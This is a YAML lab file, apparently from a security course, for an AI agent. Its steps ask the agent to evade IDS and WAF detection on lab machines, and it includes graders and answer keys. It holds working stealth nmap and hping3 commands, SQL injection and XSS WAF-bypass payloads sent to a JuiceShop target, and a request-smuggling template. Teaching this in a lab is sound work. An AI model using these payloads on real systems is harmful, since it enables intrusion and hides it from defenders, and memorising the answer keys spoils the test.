lab_id: attack-ai-week12
title: 은닉 기법 (Evasion) (AI 지원)
version: ai
course: attack-ai
week: 12
description: IDS/IPS, WAF, 안티바이러스 등 보안 장비의 탐지를 우회하는 은닉(Evasion) 기법을 실습한다. 패킷 분할, 인코딩,
  난독화, 타이밍 기법 등을 학습한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- Suricata IDS/IPS의 탐지 규칙을 이해하고 우회 방법을 실습한다
- WAF 우회 기법(인코딩, 대소문자 혼합, 주석 삽입)을 수행할 수 있다
- 공격 도구의 시그니처를 변경하여 탐지를 회피할 수 있다
pass_threshold: 0.6
steps:
- order: 1
  instruction: secu 서버({{SECU_IP}})의 Suricata 규칙을 확인하여 현재 활성화된 탐지 규칙을 파악하라.
  hint: SSH로 secu에 접속하여 Suricata 규칙 파일을 확인한다
  category: recon
  points: 10
  answer: '🤖 프롬프트: secu 서버(10.20.30.1)의 Suricata 규칙을 확인하여 현재 활성화된 탐지 규칙을 파악해줘

    📎 참고 (CLI): ssh ccc@10.20.30.1 ''ls /etc/suricata/rules/ 2>/dev/null; echo ---;
    cat /etc/suricata/rules/local.rules 2>/dev/null | head -20'' 2>/dev/null'
  answer_detail: IDS/IPS 규칙을 사전에 파악하면 탐지를 우회하는 페이로드를 설계할 수 있다. Suricata는 시그니처 기반 탐지를
    사용하므로 규칙에 매칭되지 않는 변형 공격은 탐지되지 않는다.
  verify:
    type: output_contains
    expect: '---'
    field: stdout
    semantic:
      intent: secu VM 의 Suricata 룰셋(/etc/suricata/rules/local.rules) 조회 — 활성 탐지 패턴
        파악해 회피 페이로드 설계
      success_criteria:
      - ssh ccc@<secu> + ls /etc/suricata/rules/ + cat local.rules 실행
      - 출력에 alert 또는 rule 라인 + --- 구분자
      - 시그니처 매칭 회피 전략 언급
      acceptable_methods:
      - ssh + cat /etc/suricata/rules/*.rules
      - suricatasc -c ruleset-stats
      - suricata -T -v (검증 출력)
      - python paramiko 로 원격 조회
      negative_signs:
      - 로컬 Suricata 룰 조회
      - '--- 구분자 누락'
      - 회피 전략 언급 없음
  target_vm: attacker
  script: ssh ccc@10.20.30.1 'ls /etc/suricata/rules/ 2>/dev/null; echo ---; cat /etc/suricata/rules/local.rules
    2>/dev/null | head -20' 2>/dev/null
  risk_level: low
  bastion_prompt: 'secu 서버(10.20.30.1)의 Suricata 규칙을 확인하여 현재 활성화된 탐지 규칙을 파악해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 2
  instruction: nmap 스캔의 탐지를 줄이기 위해 스텔스 기법을 적용하라. 느린 타이밍(-T1), 패킷 분할(-f), 디코이(-D)를
    사용하라.
  hint: -T1은 Sneaky 타이밍, -f는 패킷 분할, -D는 디코이이다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: nmap 스캔의 탐지를 줄이기 위해 스텔스 기법을 적용해줘

    📎 참고 (CLI): sudo nmap -sS -T1 -f -D RND:3 -p 22,80,3000 10.20.30.80 2>/dev/null
    | head -20 && echo ''Stealth scan completed with: T1 timing, fragmentation, 3
    random decoys'''
  answer_detail: -T1(Sneaky)은 패킷 전송 간격을 15초로 늘려 IDS의 시간 기반 탐지를 회피한다. -f는 패킷을 8바이트
    단위로 분할하여 시그니처 매칭을 방해한다. -D는 디코이 IP를 추가하여 실제 스캐너를 식별하기 어렵게 만든다.
  verify:
    type: output_contains
    expect: Stealth scan
    field: stdout
    semantic:
      intent: nmap 스텔스 — -T1 Sneaky 타이밍(15초 간격) + -f 패킷 분할 + -D RND:3 디코이 3개로 IDS
        회피
      success_criteria:
      - sudo nmap -sS -T1 -f -D RND:3 -p <ports> <IP> 실행
      - Stealth scan completed 메시지
      - 각 옵션(-T1, -f, -D) 의 회피 원리 설명
      acceptable_methods:
      - nmap -sS -T1 -f -D RND:N -p <ports> <IP>
      - nmap --scan-delay 15s
      - hping3 --rand-source 분리 스캔
      - masscan --rate 10 (저속)
      negative_signs:
      - -T4/T5 사용 (스텔스 반대)
      - 옵션 1개만 (복합 없음)
      - 회피 원리 설명 없음
  target_vm: attacker
  script: 'sudo nmap -sS -T1 -f -D RND:3 -p 22,80,3000 10.20.30.80 2>/dev/null | head
    -20 && echo ''Stealth scan completed with: T1 timing, fragmentation, 3 random
    decoys'''
  risk_level: medium
  bastion_prompt: 'nmap 스캔의 탐지를 줄이기 위해 스텔스 기법을 적용해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 3
  instruction: WAF 우회를 위해 SQL Injection 페이로드를 다양하게 변형하라. 대소문자 혼합, 주석 삽입, 인코딩 등을 적용하라.
  hint: UNION SELECT를 uNiOn SeLeCt, UN/**/ION SE/**/LECT 등으로 변형한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: WAF 우회를 위해 SQL Injection 페이로드를 다양하게 변형해줘

    📎 참고 (CLI): echo ''=== SQLi Evasion Payloads ==='' && echo ''1. Case mixing: uNiOn
    SeLeCt'' && echo ''2. Comment insertion: UN/**/ION SEL/**/ECT'' && echo ''3. URL
    encoding: %55%4e%49%4f%4e%20%53%45%4c%45%43%54'' && echo ''4. Double URL encoding:
    %2555%254e%2549%254f%254e'' && echo ''5. Null byte: UNION%00SELECT'' && echo ''6.
    Tab/newline: UNION%09SELECT, UNION%0aSELECT'' && echo ''---'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%29%20uNiOn%20SeLeCt%201,2,3,4,5,6,7,8,9--''
    | head -c 200'
  answer_detail: WAF는 보통 정규표현식으로 공격 패턴을 탐지한다. 대소문자 혼합, SQL 주석(/**/)을 이용한 키워드 분할, URL
    이중 인코딩 등으로 정규표현식 매칭을 우회할 수 있다.
  verify:
    type: output_contains
    expect: SQLi Evasion
    field: stdout
    semantic:
      intent: WAF SQLi 회피 6가지 페이로드 — 대소문자(uNiOn)/주석(UN/**/ION)/URL 인코딩/이중 인코딩/Null
        byte/Tab·newline
      success_criteria:
      - 6가지 회피 기법 각각 페이로드 예시
      - 실제 curl 요청으로 변형 payload 전송 시도
      - WAF 정규표현식 매칭 회피 원리 언급
      acceptable_methods:
      - echo 로 각 기법 페이로드 출력
      - curl URL-encoded 변형 전송
      - wafw00f + bypasswaf
      - sqlmap --tamper
      negative_signs:
      - 회피 기법 3개 이하
      - 실제 요청 없음
      - WAF 원리 설명 없음
  target_vm: attacker
  script: 'echo ''=== SQLi Evasion Payloads ==='' && echo ''1. Case mixing: uNiOn
    SeLeCt'' && echo ''2. Comment insertion: UN/**/ION SEL/**/ECT'' && echo ''3. URL
    encoding: %55%4e%49%4f%4e%20%53%45%4c%45%43%54'' && echo ''4. Double URL encoding:
    %2555%254e%2549%254f%254e'' && echo ''5. Null byte: UNION%00SELECT'' && echo ''6.
    Tab/newline: UNION%09SELECT, UNION%0aSELECT'' && echo ''---'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%29%20uNiOn%20SeLeCt%201,2,3,4,5,6,7,8,9--''
    | head -c 200'
  risk_level: medium
  bastion_prompt: 'WAF 우회를 위해 SQL Injection 페이로드를 다양하게 변형해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 4
  instruction: XSS 페이로드의 WAF 우회 변형을 만들어라. <script> 태그 없이 JavaScript를 실행하는 방법을 시연하라.
  hint: 이벤트 핸들러(onerror, onload), SVG, img 태그 등을 활용한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: XSS 페이로드의 WAF 우회 변형을 만들어라. <script> 태그 없이 JavaScript를 실행하는 방법을
    시연해줘

    📎 참고 (CLI): echo ''=== XSS Evasion Payloads ==='' && echo ''1. Event handler:
    <img src=x onerror=alert(1)>'' && echo ''2. SVG: <svg onload=alert(1)>'' && echo
    ''3. Body: <body onload=alert(1)>'' && echo ''4. Encoded: <img src=x onerror=\x61\x6c\x65\x72\x74(1)>''
    && echo ''5. Data URI: <a href="data:text/html,<script>alert(1)</script>">click</a>''
    && echo ''6. Template literal: ${alert(1)}'' && echo ''---'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=<img%20src%3Dx%20onerror%3Dalert(1)>''
    | head -c 200'
  answer_detail: WAF가 <script> 태그를 차단해도 HTML 이벤트 핸들러(onerror, onload, onfocus), SVG
    태그, data URI 등 다양한 경로로 JavaScript를 실행할 수 있다. WAF 우회는 끊임없는 공격-방어 경쟁이다.
  verify:
    type: output_contains
    expect: XSS Evasion
    field: stdout
    semantic:
      intent: XSS 회피 — <script> 태그 없이 event handler(onerror/onload) · SVG · data URI
        · template literal 로 JS 실행
      success_criteria:
      - 6가지 회피 기법 (img onerror/svg onload/body onload/encoded/data URI/template literal)
        페이로드
      - 실제 curl 로 onerror 변형 전송
      - WAF 의 태그 블랙리스트 한계 언급
      acceptable_methods:
      - echo 로 각 변형 payload
      - XSStrike / dalfox 자동 퍼징
      - Burp Intruder payload list
      - OWASP XSS Filter Evasion Cheat Sheet
      negative_signs:
      - <script> 만 사용
      - 변형 3개 이하
      - 태그 블랙리스트 한계 설명 없음
  target_vm: attacker
  script: 'echo ''=== XSS Evasion Payloads ==='' && echo ''1. Event handler: <img
    src=x onerror=alert(1)>'' && echo ''2. SVG: <svg onload=alert(1)>'' && echo ''3.
    Body: <body onload=alert(1)>'' && echo ''4. Encoded: <img src=x onerror=\x61\x6c\x65\x72\x74(1)>''
    && echo ''5. Data URI: <a href="data:text/html,<script>alert(1)</script>">click</a>''
    && echo ''6. Template literal: ${alert(1)}'' && echo ''---'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=<img%20src%3Dx%20onerror%3Dalert(1)>''
    | head -c 200'
  risk_level: medium
  bastion_prompt: 'XSS 페이로드의 WAF 우회 변형을 만들어라. <script> 태그 없이 JavaScript를 실행하는 방법을
    시연해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 5
  instruction: nmap의 소스 포트를 53(DNS)이나 80(HTTP)으로 위장하여 방화벽을 우회하라.
  hint: --source-port 또는 -g 옵션으로 소스 포트를 지정한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: nmap의 소스 포트를 53(DNS)이나 80(HTTP)으로 위장하여 방화벽을 우회해줘

    📎 참고 (CLI): sudo nmap -sS -g 53 -p 22,80,3000 10.20.30.80 && echo ''---'' && echo
    ''Source port 53 (DNS) often allowed through firewalls'''
  answer_detail: 일부 방화벽은 DNS(53), HTTP(80) 소스 포트에서 오는 패킷을 허용한다. nmap의 -g 옵션으로 소스 포트를
    위장하면 이러한 규칙을 우회할 수 있다.
  verify:
    type: output_contains
    expect: '---'
    field: stdout
    semantic:
      intent: nmap 소스 포트 위장 — -g 53(DNS) 또는 80(HTTP)으로 잘못 설정된 방화벽 우회 (DNS 응답 허용 규칙
        악용)
      success_criteria:
      - sudo nmap -sS -g 53 -p <ports> <IP> 실행
      - '--- 구분자 + Source port 53 allowed 설명'
      - 상태 기반 방화벽에서는 효과 제한적 언급
      acceptable_methods:
      - sudo nmap -sS -g 53 <IP>
      - sudo nmap --source-port 80
      - hping3 -s 53 -S -p <port> <IP>
      - scapy IP()/TCP(sport=53)
      negative_signs:
      - 기본 소스 포트 사용
      - 방화벽 규칙 해석 없음
      - 상태 기반 한계 언급 없음
  target_vm: attacker
  script: sudo nmap -sS -g 53 -p 22,80,3000 10.20.30.80 && echo '---' && echo 'Source
    port 53 (DNS) often allowed through firewalls'
  risk_level: medium
  bastion_prompt: 'nmap의 소스 포트를 53(DNS)이나 80(HTTP)으로 위장하여 방화벽을 우회해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 6
  instruction: User-Agent 헤더를 변경하여 보안 장비의 도구 탐지를 우회하라. curl로 일반 브라우저 User-Agent를 사용하라.
  hint: 'curl -H ''User-Agent: ...'' 옵션으로 헤더를 변경한다'
  category: exploit
  points: 10
  answer: '🤖 프롬프트: User-Agent 헤더를 변경하여 보안 장비의 도구 탐지를 우회하라. curl로 일반 브라우저 User-Agent를
    사용해줘

    📎 참고 (CLI): echo ''=== Default (curl) ==='' && curl -sI http://10.20.30.80:3000
    2>/dev/null | grep -i server && echo ''=== Spoofed (Chrome) ==='' && curl -sI
    -H ''User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
    (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'' http://10.20.30.80:3000 2>/dev/null
    | grep -i server && echo ''---'' && echo ''WAFs often block known scanner User-Agents
    (Nikto, sqlmap, Nmap)'''
  answer_detail: WAF와 IDS는 알려진 공격 도구(Nikto, sqlmap, Nmap Scripting Engine)의 User-Agent를
    시그니처로 탐지한다. 정상 브라우저 UA로 위장하면 이러한 기본 탐지를 우회할 수 있다.
  verify:
    type: output_contains
    expect: '---'
    field: stdout
    semantic:
      intent: User-Agent 헤더 위장 — curl -H 로 기본 curl UA 대신 Chrome/120 브라우저 UA 설정. WAF·IDS의
        알려진 스캐너 UA(Nikto·sqlmap·Nmap NSE) 블랙리스트 우회
      success_criteria:
      - 'curl -sI -H User-Agent: Mozilla/5.0 ... Chrome/120 으로 HTTP 요청'
      - 기본 curl UA 와 위장 UA 응답 비교
      - WAF의 UA 기반 시그니처 탐지 원리 언급
      acceptable_methods:
      - curl -A Mozilla/5.0 ... Chrome/120 Safari/537.36
      - curl --user-agent Chrome/120
      - wget --user-agent=...
      - 'python requests headers={User-Agent: ...}'
      - Burp Proxy Match and Replace 로 UA 교체
      negative_signs:
      - 기본 curl/wget UA 그대로 사용
      - 요청 없이 UA 문자열만 출력
      - WAF 의 UA 블랙리스트 원리 설명 없음
  target_vm: attacker
  script: 'echo ''=== Default (curl) ==='' && curl -sI http://10.20.30.80:3000 2>/dev/null
    | grep -i server && echo ''=== Spoofed (Chrome) ==='' && curl -sI -H ''User-Agent:
    Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
    Chrome/120.0.0.0 Safari/537.36'' http://10.20.30.80:3000 2>/dev/null | grep -i
    server && echo ''---'' && echo ''WAFs often block known scanner User-Agents (Nikto,
    sqlmap, Nmap)'''
  risk_level: medium
  bastion_prompt: 'User-Agent 헤더를 변경하여 보안 장비의 도구 탐지를 우회하라. curl로 일반 브라우저 User-Agent를
    사용해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 7
  instruction: IP 분할(fragmentation)을 사용하여 IDS 탐지를 우회하라. hping3으로 분할된 패킷을 전송하라.
  hint: hping3 -f 옵션으로 패킷을 분할한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: IP 분할(fragmentation)을 사용하여 IDS 탐지를 우회하라. hping3으로 분할된 패킷을 전송해줘

    📎 참고 (CLI): sudo hping3 -S -p 3000 -f -c 3 10.20.30.80 2>&1 | head -10 && echo
    ''---'' && echo ''IP fragmentation splits payload across multiple packets'' &&
    echo ''IDS must reassemble fragments to detect signatures'' && echo ''Some IDS
    fail to reassemble overlapping or out-of-order fragments'''
  answer_detail: IP 분할은 패킷을 여러 조각으로 나누어 IDS의 시그니처 매칭을 방해한다. IDS가 모든 프래그먼트를 올바르게 재조립하지
    못하면 공격 페이로드를 탐지할 수 없다.
  verify:
    type: output_contains
    expect: fragmentation
    field: stdout
    semantic:
      intent: IP 프래그멘테이션 — sudo hping3 -S -p 3000 -f -c 3 로 TCP SYN 패킷 분할 전송. IDS
        가 재조립하지 못하거나 overlapping/out-of-order 프래그먼트 처리 실패 시 시그니처 매칭 우회
      success_criteria:
      - sudo hping3 -S -p <port> -f -c N <IP> 실행
      - fragmentation 키워드 + 재조립 원리 설명
      - IDS 가 overlapping/out-of-order 프래그먼트 처리 실패 시 탐지 누락 언급
      acceptable_methods:
      - sudo hping3 -S -f -p <port> <IP>
      - sudo nmap -f / -ff / --mtu 8 <IP>
      - fragroute 로 IP fragment overlap 공격
      - scapy IP(flags=MF, frag=N)/TCP() 수동 제작
      negative_signs:
      - -f 옵션 누락 (분할 없음)
      - TCP segmentation 과 IP fragmentation 혼동
      - IDS 재조립 우회 원리 설명 없음
  target_vm: attacker
  script: sudo hping3 -S -p 3000 -f -c 3 10.20.30.80 2>&1 | head -10 && echo '---'
    && echo 'IP fragmentation splits payload across multiple packets' && echo 'IDS
    must reassemble fragments to detect signatures' && echo 'Some IDS fail to reassemble
    overlapping or out-of-order fragments'
  risk_level: medium
  bastion_prompt: 'IP 분할(fragmentation)을 사용하여 IDS 탐지를 우회하라. hping3으로 분할된 패킷을 전송해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 8
  instruction: HTTP 요청 스머글링(Request Smuggling)의 원리를 이해하기 위해 Content-Length와 Transfer-Encoding
    헤더를 조작하라.
  hint: CL과 TE 헤더를 동시에 사용하여 불일치를 만든다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: HTTP 요청 스머글링(Request Smuggling)의 원리를 이해하기 위해 Content-Length와 Transfer-Encoding
    헤더를 조작해줘

    📎 참고 (CLI): echo ''=== HTTP Request Smuggling ==='' && echo ''CL-TE attack:''
    && echo ''POST / HTTP/1.1'' && echo ''Content-Length: 13'' && echo ''Transfer-Encoding:
    chunked'' && echo '''' && echo ''0'' && echo '''' && echo ''SMUGGLED'' && echo
    ''---'' && echo ''When front-end (WAF) uses CL and back-end uses TE,'' && echo
    ''the SMUGGLED part is treated as a new request by the back-end'' && echo ''This
    bypasses WAF inspection entirely'''
  answer_detail: HTTP Request Smuggling은 프론트엔드(WAF/로드밸런서)와 백엔드 서버의 HTTP 파싱 차이를 악용한다.
    CL과 TE 헤더가 동시에 존재할 때 각 서버가 다르게 해석하면 WAF를 완전히 우회하는 요청을 삽입할 수 있다.
  verify:
    type: output_contains
    expect: Request Smuggling
    field: stdout
    semantic:
      intent: 'HTTP Request Smuggling CL-TE — Content-Length 13 와 Transfer-Encoding:
        chunked 동시 전송. 프론트엔드(WAF/프록시)는 CL 로 본문 길이 계산, 백엔드는 TE chunked 로 해석 → 경계 불일치로
        SMUGGLED 부분이 다음 요청으로 재해석되어 WAF 검사 완전 우회'
      success_criteria:
      - 'POST / HTTP/1.1 + Content-Length + Transfer-Encoding: chunked + 0 + SMUGGLED
        형식의 raw HTTP 페이로드 제시'
      - CL-TE 또는 TE-CL 또는 TE-TE 분기 설명
      - 프론트엔드와 백엔드 파싱 차이로 WAF 우회 원리 설명
      acceptable_methods:
      - raw HTTP 를 echo / printf 로 출력한 뒤 curl --data-binary 또는 nc <host> <port> 로
        전송
      - Burp Suite Repeater + HTTP Request Smuggler 확장
      - smuggler.py (defparam/smuggler)
      - python http.client 로 chunked 수동 전송
      negative_signs:
      - 일반 POST 요청만 전송 (CL-TE 구조 없음)
      - Content-Length 또는 Transfer-Encoding 한쪽만 사용
      - 프론트엔드/백엔드 파싱 차이 설명 없음
  target_vm: attacker
  script: 'echo ''=== HTTP Request Smuggling ==='' && echo ''CL-TE attack:'' && echo
    ''POST / HTTP/1.1'' && echo ''Content-Length: 13'' && echo ''Transfer-Encoding:
    chunked'' && echo '''' && echo ''0'' && echo '''' && echo ''SMUGGLED'' && echo
    ''---'' && echo ''When front-end (WAF) uses CL and back-end uses TE,'' && echo
    ''the SMUGGLED part is treated as a new request by the back-end'' && echo ''This
    bypasses WAF inspection entirely'''
  risk_level: medium
  bastion_prompt: 'HTTP 요청 스머글링(Request Smuggling)의 원리를 이해하기 위해 Content-Length와 Transfer-Encoding
    헤더를 조작해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 9
  instruction: Suricata의 alert 로그를 확인하여 이전 실습에서 발생한 탐지 이벤트를 분석하라.
  hint: secu 서버의 /var/log/suricata/fast.log를 확인한다
  category: analysis
  points: 10
  answer: '🤖 프롬프트: Suricata의 alert 로그를 확인하여 이전 실습에서 발생한 탐지 이벤트를 분석해줘

    📎 참고 (CLI): ssh ccc@10.20.30.1 ''tail -30 /var/log/suricata/fast.log 2>/dev/null
    || echo "No alerts found"'' 2>/dev/null'
  answer_detail: Suricata의 fast.log에는 탐지된 이벤트의 시간, 소스/목적지 IP, 규칙 ID, 메시지가 기록된다. 어떤
    공격이 탐지되었는지 분석하면 은닉 기법의 효과를 평가할 수 있다.
  verify:
    type: output_contains
    expect:
    - alert
    - Suricata
    - active
    field: stdout
    semantic:
      intent: Suricata fast.log 탐지 이벤트 분석 — ssh ccc@secu 로 원격 접속 후 /var/log/suricata/fast.log
        tail 30. 시간·소스/목적지 IP·SID·메시지로부터 이전 실습(s2 nmap 스텔스, s3 SQLi, s4 XSS)이 탐지됐는지
        확인해 은닉 기법 효과 평가
      success_criteria:
      - ssh ccc@<secu> tail -30 /var/log/suricata/fast.log 실행
      - alert 키워드 또는 No alerts found 출력 확인
      - 탐지된 SID·시간·IP 기반으로 이전 스텝 연결짓거나 미탐지면 효과 언급
      acceptable_methods:
      - ssh + tail -30 /var/log/suricata/fast.log
      - ssh + jq 로 eve.json alert 필터
      - suricatasc -c stats 또는 rule-reload
      - rsyslog/ELK 로 수집된 alert 조회
      negative_signs:
      - 로컬 fast.log 조회 (secu 가 아님)
      - alert 내용 해석 없음 — raw 출력만
      - 이전 실습 탐지 여부 분석 없음
  target_vm: attacker
  script: ssh ccc@10.20.30.1 'tail -30 /var/log/suricata/fast.log 2>/dev/null || echo
    "No alerts found"' 2>/dev/null
  risk_level: low
  bastion_prompt: Suricata의 alert 로그를 확인하여 이전 실습에서 발생한 탐지 이벤트를 분석해줘
- order: 10
  instruction: 타이밍 기반 은닉을 시연하라. 요청 간 랜덤 지연을 추가하여 IDS의 시간 기반 상관 분석을 우회하라.
  hint: sleep 명령에 랜덤 값을 사용한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 타이밍 기반 은닉을 시연해줘

    📎 참고 (CLI): for i in 1 2 3; do DELAY=$((RANDOM % 3 + 1)); echo "Request $i: delay
    ${DELAY}s"; curl -s -o /dev/null -w ''HTTP %{http_code}'' http://10.20.30.80:3000/api/Products;
    echo; sleep $DELAY; done && echo ''---'' && echo ''Random delays break IDS time-correlation
    patterns'''
  answer_detail: IDS/IPS는 일정한 간격의 반복 요청을 스캔이나 브루트포스로 탐지한다. 랜덤 지연을 추가하면 패턴이 사라져 시간
    기반 탐지를 우회할 수 있다. 실전에서는 수 초~수 분의 변동을 적용한다.
  verify:
    type: output_contains
    expect: Random delays
    field: stdout
    semantic:
      intent: 타이밍 기반 은닉 — for 루프 + DELAY=$((RANDOM % 3 + 1)) + sleep $DELAY 로 요청 간
        1~3초 랜덤 지연. IDS/IPS 의 일정 간격 반복 요청(스캔·브루트포스) 탐지 회피, 시간 기반 상관 분석 무력화
      success_criteria:
      - for 루프에서 RANDOM 또는 $RANDOM 으로 랜덤 지연 생성
      - curl 요청 N회 반복 + 각 요청 사이 sleep
      - Random delays break IDS time-correlation 원리 언급
      acceptable_methods:
      - bash for + $RANDOM + sleep + curl
      - python time.sleep(random.uniform(1,5))
      - nmap --scan-delay 1s --max-scan-delay 10s
      - hping3 -i u1000000 (1초 간격)
      negative_signs:
      - 고정 간격 sleep 사용 (랜덤 아님)
      - 단일 요청만 전송 (루프 없음)
      - 시간 기반 탐지 원리 설명 없음
  target_vm: attacker
  script: 'for i in 1 2 3; do DELAY=$((RANDOM % 3 + 1)); echo "Request $i: delay ${DELAY}s";
    curl -s -o /dev/null -w ''HTTP %{http_code}'' http://10.20.30.80:3000/api/Products;
    echo; sleep $DELAY; done && echo ''---'' && echo ''Random delays break IDS time-correlation
    patterns'''
  risk_level: medium
  bastion_prompt: '타이밍 기반 은닉을 시연해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 11
  instruction: IPv6를 사용하여 IPv4 전용 보안 장비를 우회할 수 있는지 확인하라. web 서버의 IPv6 주소를 확인하고 접근을
    시도하라.
  hint: ip -6 addr 명령으로 IPv6 주소를 확인한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: IPv6를 사용하여 IPv4 전용 보안 장비를 우회할 수 있는지 확인하라. web 서버의 IPv6 주소를 확인하고
    접근을 시도해줘

    📎 참고 (CLI): ssh ccc@10.20.30.80 ''ip -6 addr show 2>/dev/null'' 2>/dev/null &&
    echo ''---'' && echo ''IPv6 evasion: many IDS/firewalls only inspect IPv4 traffic''
    && echo ''If dual-stack is enabled, IPv6 traffic may bypass security controls'''
  answer_detail: 많은 보안 장비가 IPv4 트래픽만 검사하고 IPv6를 무시한다. 듀얼 스택 환경에서 IPv6로 통신하면 방화벽/IDS를
    완전히 우회할 수 있다. IPv6 보안 정책을 IPv4와 동일하게 적용해야 한다.
  verify:
    type: output_contains
    expect: '---'
    field: stdout
    semantic:
      intent: IPv6 우회 — ssh ccc@web ip -6 addr show 로 web 서버의 IPv6 주소 확인. IPv4 전용
        IDS/방화벽이 IPv6 트래픽을 검사하지 않는 점을 악용해 듀얼 스택 환경에서 IPv6 로 통신하면 탐지 없이 우회
      success_criteria:
      - 'ssh + ip -6 addr show 로 IPv6 주소(fe80::, 2001:: 등) 확인'
      - 'IPv6 evasion: many IDS/firewalls only inspect IPv4 traffic 언급'
      - 듀얼 스택 환경에서 IPv6 가 보안 통제 우회 가능성 설명
      acceptable_methods:
      - ssh + ip -6 addr show
      - ssh + ifconfig | grep inet6
      - nmap -6 <IPv6>
      - curl -6 http://[IPv6]/
      - ping6 fe80::...
      negative_signs:
      - IPv4 주소만 조회 (ip addr 또는 ip -4)
      - IPv6 우회 원리 설명 없음
      - 듀얼 스택 개념 누락
  target_vm: attacker
  script: 'ssh ccc@10.20.30.80 ''ip -6 addr show 2>/dev/null'' 2>/dev/null && echo
    ''---'' && echo ''IPv6 evasion: many IDS/firewalls only inspect IPv4 traffic''
    && echo ''If dual-stack is enabled, IPv6 traffic may bypass security controls'''
  risk_level: medium
  bastion_prompt: 'IPv6를 사용하여 IPv4 전용 보안 장비를 우회할 수 있는지 확인하라. web 서버의 IPv6 주소를 확인하고
    접근을 시도해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 12
  instruction: JuiceShop에 대한 SQL Injection을 WAF가 차단할 경우를 대비한 대체 페이로드를 3개 이상 작성하라.
  hint: 다양한 인코딩과 문법 변형을 적용한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: JuiceShop에 대한 SQL Injection을 WAF가 차단할 경우를 대비한 대체 페이로드를 3개 이상 구현
    방법을 설명하고 예시 코드를 보여줘

    📎 참고 (CLI): echo ''=== WAF Bypass SQLi Payloads ==='' && for payload in "''%20OR%201%3D1--"
    "''%20oR%20''1''%3D''1''--" "''%20OR%20true--" "''+OR+''1''%3D''1''--" "''%20||%201%3D1--";
    do echo -n "Payload: $payload -> "; curl -s -o /dev/null -w ''HTTP %{http_code}''
    -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
    -d "{\"email\":\"$payload\",\"password\":\"a\"}"; echo; done'
  answer_detail: 동일한 SQL Injection 결과를 달성하는 페이로드는 무수히 많다. OR 1=1, OR true, || 1=1,
    OR '1'='1' 등 문법적으로 동일하지만 시그니처가 다른 변형을 사용하면 WAF를 우회할 수 있다.
  verify:
    type: output_contains
    expect: WAF Bypass SQLi
    field: stdout
    semantic:
      intent: JuiceShop 로그인 엔드포인트(/rest/user/login) 대상 WAF SQLi 회피 페이로드 5종 변형 — URL-encoded
        OR 1=1, 대소문자 혼합 oR, OR true 대체 문법, + 대신 공백, || 대체 연산자. 동일 결과를 얻는 시그니처 다양화로
        WAF 정규식 매칭 우회
      success_criteria:
      - 5개 이상 대체 페이로드를 for 루프로 POST /rest/user/login 에 전송
      - 각 페이로드 HTTP 상태코드 확인 (200/401/403 비교)
      - 동일 의미(OR 1=1) 다른 시그니처 변형 원리 언급
      acceptable_methods:
      - for 루프 + curl -X POST + JSON body 에 변형 페이로드 삽입
      - sqlmap --tamper=between,space2comment,charencode 다중 tamper 조합
      - Burp Intruder payload list + grep match
      - ffuf -w payloads.txt 로 페이로드 퍼징
      negative_signs:
      - 3개 미만의 페이로드
      - 실제 HTTP 전송 없이 출력만
      - 동일 의미 다른 시그니처 개념 설명 없음
  target_vm: attacker
  script: 'echo ''=== WAF Bypass SQLi Payloads ==='' && for payload in "''%20OR%201%3D1--"
    "''%20oR%20''1''%3D''1''--" "''%20OR%20true--" "''+OR+''1''%3D''1''--" "''%20||%201%3D1--";
    do echo -n "Payload: $payload -> "; curl -s -o /dev/null -w ''HTTP %{http_code}''
    -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
    -d "{\"email\":\"$payload\",\"password\":\"a\"}"; echo; done'
  risk_level: medium
  bastion_prompt: 'JuiceShop에 대한 SQL Injection을 WAF가 차단할 경우를 대비한 대체 페이로드를 3개 이상 작성하라.


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 13
  instruction: Suricata 규칙을 분석하여 탐지를 우회하는 페이로드를 설계하는 방법을 설명하라.
